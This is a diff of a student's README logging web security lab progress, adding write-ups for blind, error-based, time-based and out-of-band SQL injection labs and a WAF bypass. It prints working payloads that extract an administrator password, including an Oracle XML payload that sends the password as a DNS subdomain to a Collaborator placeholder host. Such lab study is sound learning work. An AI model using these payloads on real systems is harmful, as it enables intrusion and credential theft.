@@ -11,14 +11,14 @@ B.Tech Cybersecurity Engineering Student | Application Security Learner
 
 | Topic | Total Labs | Completed | Status |
 |-------|-----------|-----------|--------|
-| SQL Injection | 18 | 11 | 🔄 In Progress |
+| SQL Injection | 18 | 18 | ✅ Complete |
 | Authentication | 14 | 0 | ⏳ Upcoming |
 | Access Control | 13 | 0 | ⏳ Upcoming |
 | XSS | 30 | 0 | ⏳ Upcoming |
 | CSRF | 8 | 0 | ⏳ Upcoming |
 | SSRF | 7 | 0 | ⏳ Upcoming |
 | XXE | 9 | 0 | ⏳ Upcoming |
-| **Total** | **99** | **11** | |
+| **Total** | **99** | **18** | |
 
 ---
 
@@ -349,26 +349,349 @@ Result       : Matched rows = correct characters
 
 ---
 
+### Lab 12 — Blind SQLi with Conditional Errors ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** Blind SQL Injection using error-based responses (Oracle Database)
+
+**What I did:**
+- Found that triggering a database error = TRUE condition
+- Used TO_CHAR(1/0) to cause divide-by-zero error as true indicator
+- Used Sniper attack to find exact password length
+- Used Cluster Bomb attack to extract password character by character
+
+**Step 1 — Find Password Length (Sniper Attack):**
+```
+'AND+(SELECT+CASE+WHEN+LENGTH(password)>1
++THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users
++WHERE+username='administrator')='a'--
+
+Logic:
+→ Server Error 500 = condition TRUE (length is greater)
+→ Normal response = condition FALSE (length is smaller)
+→ Increment number until no error = exact length found
+```
+
+**Step 2 — Extract Password (Cluster Bomb Attack):**
+```
+'AND+(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)='§a§'
++THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users
++WHERE+username='administrator')='a'--
+
+Burp Intruder Setup:
+→ Attack Type: Cluster Bomb
+→ Payload 1: Character position (1 to 20)
+→ Payload 2: a-z and 0-9
+→ Filter: Status 500 = correct character
+```
+
+**What I Learned:**
+- Oracle uses TO_CHAR(1/0) to trigger intentional divide-by-zero error
+- Oracle uses SUBSTR() not SUBSTRING() for character extraction
+- Error-based blind SQLi uses HTTP status codes as true/false indicator
+- Status 500 = condition true, Status 200 = condition false
+
+---
+
+### Lab 13 — Visible Error-Based SQL Injection ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** SQL Injection leaking data through verbose error messages (PostgreSQL)
+
+**What I did:**
+- Used CAST() function to force database to convert string to integer
+- Database threw error containing the actual string value
+- Error message leaked username and password directly
+
+**Step 1 — Extract Username:**
+```
+'AND 1=CAST((SELECT username FROM users LIMIT 1)as int)--
+
+Result:
+→ Server returned 500 error
+→ Error message leaked: "administrator"
+→ First username = administrator
+```
+
+**Step 2 — Extract Password:**
+```
+'AND 1=CAST((SELECT password FROM users LIMIT 1)as int)--
+
+Result:
+→ Server returned 500 error
+→ Error message leaked password directly
+→ Password: xeu2fy3zjhnnt1gwnhpvr
+```
+
+**What I Learned:**
+- CAST() forces type conversion which throws verbose errors
+- PostgreSQL error messages sometimes leak actual data values
+- LIMIT 1 ensures only one row returned to avoid errors
+- Verbose error messages are a serious security misconfiguration
+- This is faster than boolean-based blind SQLi
+
+---
+
+### Lab 14 — Blind SQLi Time Delays ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** Blind SQL Injection using time delays (PostgreSQL)
+
+**What I did:**
+- Identified that tracking ID cookie was injectable
+- Tested MySQL sleep() function — did not work
+- Tested PostgreSQL pg_sleep() function — worked
+- Confirmed vulnerability using 10 second response delay
+
+**Payloads Tested:**
+```
+-- MySQL (did not work):
+'||(SELECT sleep(10))--
+Response: 330 milliseconds (no delay = not MySQL)
+
+-- PostgreSQL (worked):
+'||(SELECT+pg_sleep(10))--
+Response: 10,255 milliseconds (10 sec delay = PostgreSQL confirmed)
+```
+
+**What I Learned:**
+- Time-based blind SQLi works when no output and no errors visible
+- Different databases have different sleep functions
+- MySQL uses sleep(), PostgreSQL uses pg_sleep()
+- Response time is the only indicator in time-based blind SQLi
+- Burp Repeater shows response time in milliseconds
+
+---
+
+### Lab 15 — Blind SQLi Time Delays and Data Extraction ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** Blind SQL Injection — extracting data via time delays (PostgreSQL)
+
+**What I did:**
+- Confirmed vulnerability using CASE WHEN with pg_sleep
+- Verified administrator user exists in database
+- Found exact password length = 20 characters
+- Extracted full password using Cluster Bomb attack
+
+**Step 1 — Confirm Vulnerability:**
+```
+-- TRUE condition (1=1):
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10)
+ELSE pg_sleep(0) END)--
+Response: 10,567 ms (delayed = confirmed)
+
+-- FALSE condition (1=2):
+'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10)
+ELSE pg_sleep(0) END)--
+Response: 594 ms (no delay = confirmed)
+```
+
+**Step 2 — Confirm Administrator Exists:**
+```
+'||(SELECT+CASE+WHEN+(username='administrator')
++THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END FROM users)--
+
+Response: 10,620 ms = administrator exists ✅
+```
+
+**Step 3 — Find Password Length:**
+```
+'||(SELECT+CASE+WHEN+(username='administrator'
+AND LENGTH(password)>19)+THEN+pg_sleep(10)
++ELSE+pg_sleep(0)+END FROM users)--
+Response: 10,309 ms = password longer than 19 chars ✅
+
+'||(SELECT+CASE+WHEN+(username='administrator'
+AND LENGTH(password)>20)+THEN+pg_sleep(10)
++ELSE+pg_sleep(0)+END FROM users)--
+Response: 580 ms = NOT longer than 20
+
+Password Length = 20 ✅
+```
+
+**Step 4 — Extract Password (Cluster Bomb):**
+```
+'||(SELECT+CASE+WHEN+(username='administrator'
+AND SUBSTRING(password,§1§,1)='§a§')
++THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END FROM users)--
+
+Burp Intruder Setup:
+→ Attack Type: Cluster Bomb
+→ Payload 1: 1 to 20 (character position)
+→ Payload 2: a-z and 0-9
+→ Filter: Response time > 10000ms = correct character
+
+Extracted Password: nm6ybys9w1hsrggi0e8z ✅
+```
+
+**What I Learned:**
+- CASE WHEN with pg_sleep gives precise true/false via timing
+- Binary search method finds password length efficiently
+- Cluster Bomb automates character-by-character extraction
+- Response time column in Intruder identifies correct characters
+- Time-based extraction is slower but works on any database
+
+---
+
+### Lab 16 — Blind SQLi Out-of-Band Interaction ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** Blind SQL Injection using DNS out-of-band channel (Oracle)
+
+**What I did:**
+- Used Burp Collaborator to generate unique external URL
+- Injected XML payload to force Oracle to make DNS lookup
+- Confirmed vulnerability when DNS request arrived at Collaborator
+
+**Burp Collaborator Setup:**
+```
+Step 1 → Burp menu → Burp Collaborator Client
+Step 2 → Click "Copy to clipboard"
+Step 3 → Unique URL generated: [random].oastify.com
+```
+
+**Payload Used:**
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM
+"http://YOUR-COLLABORATOR-URL/">
+%remote;]>'),'/l')+FROM+dual--
+
+Result:
+→ Collaborator received DNS lookup ✅
+→ Confirms out-of-band channel works
+→ Oracle made external HTTP/DNS request
+```
+
+**What I Learned:**
+- Out-of-band SQLi used when no visual or timing indicators available
+- Burp Collaborator provides external URL to catch server callbacks
+- EXTRACTVALUE with XML entity forces Oracle to make DNS request
+- oastify.com is Burp Suite's official Collaborator domain
+- Oracle's XML processing can trigger external network requests
+
+---
+
+### Lab 17 — Blind SQLi Out-of-Band Data Exfiltration ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** Blind SQL Injection — password extracted via DNS lookup (Oracle)
+
+**What I did:**
+- Used Burp Collaborator URL with password embedded in subdomain
+- Oracle made DNS lookup containing administrator password
+- Password appeared in Collaborator as part of the domain name
+
+**Payload Used:**
+```
+'UNION+SELECT+EXTRACTVALUE(xmltype('
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM
+"http://'||(SELECT+password+FROM+users
++WHERE+username='administrator')||
+'.YOUR-COLLABORATOR-URL/">
+%remote;]>'),'/l')+FROM+dual--
+
+How it works:
+→ Oracle builds URL with password as subdomain
+→ URL becomes: [password].collaborator-url.oastify.com
+→ DNS lookup sent to Collaborator
+→ Collaborator logs show full domain with password
+```
+
+**Result:**
+```
+Collaborator received DNS request:
+→ Subdomain contained the password
+→ Extracted Password: ocytv5czb7ske6uk8yob
+→ Logged in as administrator successfully ✅
+```
+
+**What I Learned:**
+- Password embedded in DNS subdomain using string concatenation
+- Oracle || operator concatenates password into URL
+- DNS exfiltration bypasses all output restrictions completely
+- Most powerful blind SQLi — works even with strict firewalls
+- Collaborator logs full DNS request including all subdomains
+
+---
+
+### Lab 18 — SQL Injection with Filter Bypass via XML Encoding ✅
+**Difficulty:** Practitioner  
+**Vulnerability:** SQL Injection bypassing WAF using XML hex encoding
+
+**What I did:**
+- Installed HackVector Burp extension for payload encoding
+- Found SQL injection in XML-based product stock check feature
+- WAF was blocking all normal SQL injection payloads
+- Used hex_entities encoding to bypass WAF detection
+- Extracted administrator password via UNION attack
+
+**Setup:**
+```
+Step 1 → Burp Suite → Extender tab
+Step 2 → BApp Store → Search "HackVector"
+Step 3 → Install HackVector extension
+```
+
+**Finding the Injection Point:**
+```
+→ Add item to cart
+→ Click "Check stock" on product page
+→ Intercept request in Burp Suite
+→ Found XML body with productId parameter
+→ Normal SQL payloads blocked by WAF here
+```
+
+**Bypassing WAF with Hex Encoding:**
+```
+Step 1 → Type UNION payload in productId field
+Step 2 → Select the payload text in Burp
+Step 3 → Right click → Extensions
+         → HackVector → hex_entities
+
+Step 4 → Payload gets encoded automatically:
+Normal:  UNION SELECT password from users
+         where username='administrator'--
+
+Encoded: &#x55;&#x4e;&#x49;&#x4f;&#x4e;...
+(WAF cannot recognize encoded SQL keywords)
+
+Step 5 → Send encoded payload
+Step 6 → Response contains administrator password
+```
+
+**Extracted Password:**
+```
+bhb1t4qozu37er5esp3x ✅
+```
+
+**What I Learned:**
+- WAFs detect common SQL keywords like UNION and SELECT
+- HTML hex encoding bypasses WAF signature-based detection
+- HackVector extension automates encoding directly in Burp
+- hex_entities converts each character to HTML hex entity code
+- WAF bypass is a critical real-world penetration testing skill
+- XML injection points in stock checkers are commonly overlooked
+
+---
+
+## SQL Injection — Complete ✅
+
 ## Tools Used
 
 | Tool | Purpose |
 |------|---------|
-| Burp Suite Professional | Request interception, Repeater, Intruder |
+| Burp Suite Professional | Request interception, Repeater, Intruder, Collaborator |
+| HackVector Extension | Payload encoding for WAF bypass |
 | Kali Linux | Testing environment |
-| Firefox | Browser with Burp proxy |
+| Firefox | Browser with Burp proxy configured |
 
 ---
 
-## Key Takeaways
+## Key Takeaways — SQL Injection Module
 
-- SQL Injection is still the most critical web vulnerability
-- Different databases have different syntax but same core concept
-- Blind SQLi is just as dangerous even without visible output
-- Burp Suite Pro massively speeds up exploitation
+- SQL Injection is the most critical web vulnerability (OWASP #1)
+- Different databases have completely different syntax
+- Blind SQLi is equally dangerous even without visible output
+- Out-of-band techniques work when everything else fails
+- WAFs can be bypassed using encoding techniques
+- Burp Suite Pro massively speeds up exploitation with Intruder
 - Prevention: Always use parameterized queries and prepared statements
-- Input validation alone is never enough to prevent SQLi
-
-
-
-
-  
+- Input validation alone is never enough to prevent SQL Injection
